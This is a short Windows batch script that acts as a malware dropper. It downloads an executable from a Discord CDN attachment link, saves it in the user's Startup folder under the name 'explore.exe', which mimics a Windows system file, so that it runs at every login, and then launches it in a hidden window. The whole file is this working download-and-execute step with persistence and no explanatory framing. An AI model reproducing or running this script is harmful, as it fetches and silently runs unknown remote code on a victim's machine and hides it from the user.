@echo off

set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set "DownloadURL=https://cdn.discordapp.com/attachments/1164564797854068836/1170119323948425296/x.exe?ex=6557e18a&is=65456c8a&hm=0e4cccdc65eba3edcc320070d9118f3fd04217a9eaf55450f44461bcf3253a89&"
set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
